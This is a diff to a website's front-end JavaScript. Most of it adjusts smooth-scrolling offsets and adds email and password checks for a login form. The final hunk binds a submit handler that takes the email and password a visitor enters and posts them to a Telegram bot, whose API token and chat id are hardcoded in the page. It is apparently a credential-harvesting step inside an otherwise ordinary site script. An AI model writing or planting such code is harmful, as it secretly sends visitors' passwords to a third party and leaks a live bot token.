@@ -58,6 +58,10 @@ $(document).ready(function () {
   //   plugins: [lgZoom, lgThumbnail],
   // });
 
+  var section = document.querySelector('.section_id');
+  var sectionPadding = window.getComputedStyle(section);
+  var paddingScroll = parseFloat(sectionPadding.paddingTop);
+
   var scrollToSection = function scrollToSection(event) {
     event.preventDefault();
     var el = $(this);
@@ -66,7 +70,7 @@ $(document).ready(function () {
     if (dest !== undefined && dest !== '') {
       // проверяем существование
       $('html').animate({
-        scrollTop: $(dest).offset().top - 100 // прокручиваем страницу к требуемому элементу
+        scrollTop: $(dest).offset().top - paddingScroll + 30 // прокручиваем страницу к требуемому элементу
 
       }, 1000 // скорость прокрутки
       );
@@ -78,8 +82,13 @@ $(document).ready(function () {
   $('.header_menu-link').on("click", scrollToSection);
   $('.scroll_down').on("click", scrollToSection);
   $('.scrool_map').on("click", scrollToSection);
+  var header = document.querySelector('.header');
+  var headerStyle = window.getComputedStyle(header);
+  var headerHeight = parseFloat(headerStyle.height);
+  console.log(headerHeight);
   var element = document.getElementById('hero').getBoundingClientRect();
-  var height = element.height - 80; // зміна bg на header при скролінгу сторінки
+  console.log(element.height);
+  var height = element.height - headerHeight; // зміна bg на header при скролінгу сторінки
 
   $(window).scroll(function () {
     if ($(this).scrollTop() > height) {
@@ -116,4 +125,113 @@ $(document).ready(function () {
     toggleThumb: true // ... other settings
 
   });
-});
+}); // Валідація форми
+
+var EMAIL_MIN_LENGHT = 5;
+var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+
+function testPasswordRegex(value) {
+  return mediumRegex.test(value);
+}
+
+function checkEmailLenght() {
+  var valueLenght = window.inputEmail.value.length;
+  var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
+
+  if (diff) {
+    window.emailDiffCount.textContent = diff;
+    window.emailLenghtHelp.classList.remove('d-none');
+  } else {
+    window.emailLenghtHelp.classList.add('d-none');
+  }
+}
+
+;
+
+function resetValidation() {
+  window.emailHelp.classList.add('d-none');
+  window.passwordHelp.classList.add('d-none');
+  window.passwordHelpDescription.classList.add('d-none');
+}
+
+function validateForm(event) {
+  event.preventDefault();
+  resetValidation();
+  var email = window.inputEmail.value;
+  var password = window.inputPassword.value;
+
+  if (!email) {
+    window.emailHelp.classList.remove('d-none');
+    return false;
+  }
+
+  if (!password) {
+    window.passwordHelp.classList.remove('d-none');
+    return false;
+  }
+
+  if (!testPasswordRegex(password)) {
+    window.passwordHelp.classList.remove('d-none');
+    window.passwordHelpDescription.classList.remove('d-none');
+  }
+}
+
+function formSubmit(event) {
+  var email, password, apiToken, chatId, text, urlString, response, resp;
+  return regeneratorRuntime.async(function formSubmit$(_context) {
+    while (1) {
+      switch (_context.prev = _context.next) {
+        case 0:
+          event.preventDefault();
+          email = window.inputEmail.value;
+          password = window.inputPassword.value;
+
+          if (!(!email || !password)) {
+            _context.next = 5;
+            break;
+          }
+
+          return _context.abrupt("return", false);
+
+        case 5:
+          apiToken = "6412142701:AAFqsqMVnxL0I3awtWVuK4_1i8gHEF-7zl0";
+          chatId = "-1001923473956";
+          text = "\n    <b>Email: </b> ".concat(email, "\n    <b>Password </b> ").concat(password, "\n    ");
+          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
+          _context.next = 11;
+          return regeneratorRuntime.awrap(fetch(urlString, {
+            method: 'post',
+            headers: {
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: text,
+              parse_mode: 'HTML'
+            })
+          }));
+
+        case 11:
+          response = _context.sent;
+          _context.next = 14;
+          return regeneratorRuntime.awrap(response.json());
+
+        case 14:
+          resp = _context.sent;
+          console.log(resp); // let request = new XMLHttpRequest();
+          // request.open("GET", urlString);
+          // request.send();
+          // let response = request.response;
+          // Do what you want with response
+
+        case 16:
+        case "end":
+          return _context.stop();
+      }
+    }
+  });
+} // window.inputEmail.addEventListener('input', checkEmailLenght);
+
+
+window.loginForm.addEventListener('submit', formSubmit);
